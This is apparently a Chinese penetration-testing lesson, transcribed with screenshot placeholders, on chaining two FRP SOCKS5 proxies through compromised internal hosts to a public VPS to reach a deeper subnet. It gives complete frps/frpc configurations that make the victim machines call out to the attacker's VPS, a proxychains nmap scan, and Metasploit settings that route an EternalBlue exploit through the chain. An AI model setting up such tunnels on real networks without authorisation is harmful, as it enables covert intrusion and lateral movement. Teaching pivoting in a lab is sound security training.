在本节课中，我们将学习如何使用FRP工具创建二层Socks代理。这是一种在复杂内网环境中进行流量转发的技术，通过多层代理实现对更深层网络（例如192.168.33.0/24网段）的访问。我们将从配置原理讲起，然后进行实际操作演示。

## 概述与网络拓扑

首先，我们需要理解本次实验的网络拓扑结构。我们有三台关键机器：
*   **VPS**： 位于公网，IP为 `47.101.214.85`，作为整个代理链的起点。
*   **Target-1**： 第一台内网机器，IP为 `192.168.2.1`。它是我们首先攻陷的Web服务器，可以访问 `192.168.2.0/24` 网段。
*   **Target-2**： 第二台内网机器，IP为 `192.168.2.2`。它位于 `192.168.2.0/24` 网段，并且可以访问目标网段 `192.168.33.0/24`。

![](img/e97cf1df70a24f2fee727f0d7a3629c6_8.png)

![](img/e97cf1df70a24f2fee727f0d7a3629c6_10.png)

我们的目标是：从公网（VPS）通过代理链，最终访问到 `192.168.33.33` 这台内网机器。

![](img/e97cf1df70a24f2fee727f0d7a3629c6_12.png)

![](img/e97cf1df70a24f2fee727f0d7a3629c6_14.png)

上一节我们介绍了基本的FRP Socks代理，本节中我们来看看如何构建更复杂的二层代理。

## 第一步：建立第一层代理（VPS 到 Target-1）

![](img/e97cf1df70a24f2fee727f0d7a3629c6_16.png)

![](img/e97cf1df70a24f2fee727f0d7a3629c6_18.png)

首先，我们需要在VPS和Target-1之间建立第一层Socks代理通道，以便能访问 `192.168.2.0/24` 网段。

![](img/e97cf1df70a24f2fee727f0d7a3629c6_20.png)

![](img/e97cf1df70a24f2fee727f0d7a3629c6_21.png)

**在VPS（服务端）的操作：**
在VPS上运行FRP服务端，监听7000端口，等待客户端连接。
```bash
# 在VPS上执行
./frps -c ./frps.ini
```
`frps.ini` 配置文件通常包含：
```ini
[common]
bind_port = 7000
```

![](img/e97cf1df70a24f2fee727f0d7a3629c6_22.png)

![](img/e97cf1df70a24f2fee727f0d7a3629c6_24.png)

![](img/e97cf1df70a24f2fee727f0d7a3629c6_26.png)

![](img/e97cf1df70a24f2fee727f0d7a3629c6_28.png)

**在Target-1（客户端）的操作：**
在已控制的Target-1机器上传FRP客户端，并配置其连接VPS的服务端，同时开启一个Socks5代理服务。
```bash
# 在Target-1上执行
./frpc -c ./frpc.ini
```
Target-1的 `frpc.ini` 配置文件内容如下：
```ini
[common]
server_addr = 47.101.214.85
server_port = 7000

![](img/e97cf1df70a24f2fee727f0d7a3629c6_30.png)

![](img/e97cf1df70a24f2fee727f0d7a3629c6_31.png)

![](img/e97cf1df70a24f2fee727f0d7a3629c6_33.png)

![](img/e97cf1df70a24f2fee727f0d7a3629c6_34.png)

[socks5_proxy_2]
type = tcp
remote_port = 10088
plugin = socks5
```
**配置解读：**
*   `server_addr` 和 `server_port` 指向VPS的服务端。
*   `[socks5_proxy_2]` 定义了一个代理项。
*   `remote_port = 10088` 表示在VPS上开启 `10088` 端口作为Socks5代理入口。
*   `plugin = socks5` 指定使用Socks5插件。

![](img/e97cf1df70a24f2fee727f0d7a3629c6_35.png)

![](img/e97cf1df70a24f2fee727f0d7a3629c6_37.png)

![](img/e97cf1df70a24f2fee727f0d7a3629c6_39.png)

**操作结果：**
执行成功后，我们可以在VPS上通过 `10088` 端口使用Socks5代理，流量会被转发到Target-1，从而可以访问 `192.168.2.0/24` 网段。

![](img/e97cf1df70a24f2fee727f0d7a3629c6_41.png)

![](img/e97cf1df70a24f2fee727f0d7a3629c6_43.png)

## 第二步：建立第二层代理（Target-1 到 Target-2）

![](img/e97cf1df70a24f2fee727f0d7a3629c6_44.png)

![](img/e97cf1df70a24f2fee727f0d7a3629c6_46.png)

现在我们已经能到达Target-1所在的网段。为了访问更深的 `192.168.33.0/24` 网段，需要在Target-1和Target-2之间建立第二层代理。

![](img/e97cf1df70a24f2fee727f0d7a3629c6_48.png)

![](img/e97cf1df70a24f2fee727f0d7a3629c6_49.png)

![](img/e97cf1df70a24f2fee727f0d7a3629c6_50.png)

**在Target-1（作为第二层服务端）的操作：**
让Target-1也运行一个FRP服务端，监听7000端口，等待来自Target-2的连接。
```bash
# 在Target-1上执行
./frps -c ./frps.ini
```
Target-1的 `frps.ini` 配置：
```ini
[common]
bind_port = 7000
```

![](img/e97cf1df70a24f2fee727f0d7a3629c6_52.png)

![](img/e97cf1df70a24f2fee727f0d7a3629c6_54.png)

**在Target-2（作为第二层客户端）的操作：**
在Target-2机器上运行FRP客户端，连接Target-1的服务端，并配置另一个Socks5代理。
```bash
# 在Target-2上执行
./frpc -c ./frpc.ini
```
Target-2的 `frpc.ini` 配置文件内容如下：
```ini
[common]
server_addr = 192.168.2.1 # 指向Target-1的IP
server_port = 7000

![](img/e97cf1df70a24f2fee727f0d7a3629c6_56.png)

![](img/e97cf1df70a24f2fee727f0d7a3629c6_58.png)

![](img/e97cf1df70a24f2fee727f0d7a3629c6_60.png)

[socks5_to_33]
type = tcp
remote_port = 10089
plugin = socks5
```
**配置解读：**
*   `server_addr` 指向内网的Target-1 (`192.168.2.1`)。
*   `[socks5_to_33]` 的命名表明此代理用于访问33网段。
*   `remote_port = 10089` 表示在Target-1上开启 `10089` 端口，作为通往Target-2的Socks5代理入口。

![](img/e97cf1df70a24f2fee727f0d7a3629c6_62.png)

**操作结果：**
执行成功后，在Target-1本地会监听 `10089` 端口。通过这个端口的Socks5代理，流量可以被转发到Target-2，从而能够访问 `192.168.33.0/24` 网段。

![](img/e97cf1df70a24f2fee727f0d7a3629c6_64.png)

![](img/e97cf1df70a24f2fee727f0d7a3629c6_65.png)

## 第三步：链接两层代理（流量转发）

![](img/e97cf1df70a24f2fee727f0d7a3629c6_67.png)

目前我们有两个独立的代理链：
1.  VPS:10088 <--> Target-1 (可访问2.0/24网段)
2.  Target-1:10089 <--> Target-2 (可访问33.0/24网段)

![](img/e97cf1df70a24f2fee727f0d7a3629c6_69.png)

![](img/e97cf1df70a24f2fee727f0d7a3629c6_70.png)

![](img/e97cf1df70a24f2fee727f0d7a3629c6_71.png)

![](img/e97cf1df70a24f2fee727f0d7a3629c6_72.png)

![](img/e97cf1df70a24f2fee727f0d7a3629c6_74.png)

我们需要将这两条链连接起来。关键操作在Target-1上完成：**将来自第一层代理（VPS）的流量，转发到第二层代理的入口。**

![](img/e97cf1df70a24f2fee727f0d7a3629c6_76.png)

![](img/e97cf1df70a24f2fee727f0d7a3629c6_78.png)

![](img/e97cf1df70a24f2fee727f0d7a3629c6_80.png)

**在Target-1上的核心转发配置：**
我们需要修改Target-1上连接VPS的那个FRP客户端配置，增加一个**流量转发**的配置段。
以下是更新后的Target-1的 `frpc.ini`：
```ini
[common]
server_addr = 47.101.214.85
server_port = 7000

![](img/e97cf1df70a24f2fee727f0d7a3629c6_82.png)

![](img/e97cf1df70a24f2fee727f0d7a3629c6_83.png)

![](img/e97cf1df70a24f2fee727f0d7a3629c6_85.png)

[socks5_proxy_2]
type = tcp
remote_port = 10088
plugin = socks5

![](img/e97cf1df70a24f2fee727f0d7a3629c6_87.png)

![](img/e97cf1df70a24f2fee727f0d7a3629c6_89.png)

[socks5_to_33_forward] # 新增的转发配置
type = tcp
local_ip = 127.0.0.1
local_port = 10089
remote_port = 10090
```
**新增配置解读：**
*   `[socks5_to_33_forward]`： 定义了一个端口转发规则。
*   `local_ip` 和 `local_port = 10089`： 指定转发的目标，即Target-1本地的 `10089` 端口（第二层代理入口）。
*   `remote_port = 10090`： 指定在VPS上开启 `10090` 端口。所有连接到VPS `10090` 端口的流量，都会被转发到 `local_ip:local_port`，即 `127.0.0.1:10089`。

![](img/e97cf1df70a24f2fee727f0d7a3629c6_90.png)

![](img/e97cf1df70a24f2fee727f0d7a3629c6_91.png)

![](img/e97cf1df70a24f2fee727f0d7a3629c6_93.png)

现在，整个二层代理已经搭建完成。我们来梳理一下一个访问 `192.168.33.33` 的请求的完整路径：

![](img/e97cf1df70a24f2fee727f0d7a3629c6_108.png)

![](img/e97cf1df70a24f2fee727f0d7a3629c6_109.png)

1.  **发起请求**： 攻击者在自己的工具（如浏览器、MSF）中设置Socks5代理为 `VPS_IP:10090`。
2.  **进入第一层代理**： 请求到达VPS的 `10090` 端口。
3.  **第一次转发**： 根据Target-1上的 `[socks5_to_33_forward]` 规则，VPS将请求通过已建立的通道转发到Target-1的 `127.0.0.1:10089`。
4.  **进入第二层代理**： Target-1的 `10089` 端口正是通往Target-2的Socks5代理入口。请求进入第二层代理通道。
5.  **到达目标网络**： 请求被转发到Target-2。
6.  **访问最终目标**： Target-2作为最后一跳，将请求发送给真正的目标 `192.168.33.33`。
7.  **响应返回**： 目标的响应沿原路径反向返回给攻击者。

![](img/e97cf1df70a24f2fee727f0d7a3629c6_111.png)

![](img/e97cf1df70a24f2fee727f0d7a3629c6_113.png)

![](img/e97cf1df70a24f2fee727f0d7a3629c6_115.png)

**公式化表示流量路径：**
`攻击者 -> VPS:10090 -> (FRP通道) -> Target-1:10089 -> (FRP通道) -> Target-2 -> 目标(192.168.33.33)`

## 验证与利用

![](img/e97cf1df70a24f2fee727f0d7a3629c6_124.png)

以下是验证代理是否生效的操作：

![](img/e97cf1df70a24f2fee727f0d7a3629c6_126.png)

**1. 使用ProxyChains进行扫描：**
在攻击机上，配置ProxyChains使用 `VPS_IP:10090` 代理，然后扫描目标网段。
```bash
# 编辑 /etc/proxychains.conf
# 末尾添加：
socks5 VPS_IP 10090

![](img/e97cf1df70a24f2fee727f0d7a3629c6_128.png)

![](img/e97cf1df70a24f2fee727f0d7a3629c6_130.png)

![](img/e97cf1df70a24f2fee727f0d7a3629c6_132.png)

# 使用代理进行扫描
proxychains nmap -sT -Pn 192.168.33.33
```
如果能看到 `192.168.33.33` 的开放端口（如445、3389），说明二层代理成功。

![](img/e97cf1df70a24f2fee727f0d7a3629c6_134.png)

![](img/e97cf1df70a24f2fee727f0d7a3629c6_136.png)

**2. 在Metasploit (MSF) 中使用代理：**
可以在MSF中为特定模块或全局设置代理。
*   **全局代理**（所有模块流量都走代理）：
    ```msf
    msf6 > setg Proxies socks5:VPS_IP:10090
    msf6 > setg ReverseAllowProxy true
    ```
*   **模块级代理**（仅当前模块走代理）：
    ```msf
    msf6 > use exploit/windows/smb/ms17_010_eternalblue
    msf6 > set RHOSTS 192.168.33.33
    msf6 > set Proxies socks5:VPS_IP:10090
    ```
设置后，MSF发往 `192.168.33.33` 的攻击流量就会通过我们搭建的二层代理链。

## 注意事项与总结

**本节课中我们一起学习了FRP搭建二层Socks代理的全过程。** 关键点总结如下：

1.  **理解拓扑**： 清晰区分VPS、Target-1、Target-2的角色和网络位置是成功配置的基础。
2.  **分层建立**： 代理是分层建立的。先构建VPS到Target-1的通道，再构建Target-1到Target-2的通道。
3.  **核心是转发**： 二层代理的关键在于在**中间节点（Target-1）** 配置端口转发（`[socks5_to_33_forward]`），将第一层代理的出口与第二层代理的入口连接起来。
4.  **端口对应**： 注意 `remote_port`（在服务端开启的端口）和 `local_port`（客户端本地端口）的对应关系，这是流量导向的指南。
5.  **灵活应用**： 此方法可扩展至更多层代理（N层），原理相通，只需在每一跳的中间节点配置相应的转发规则。
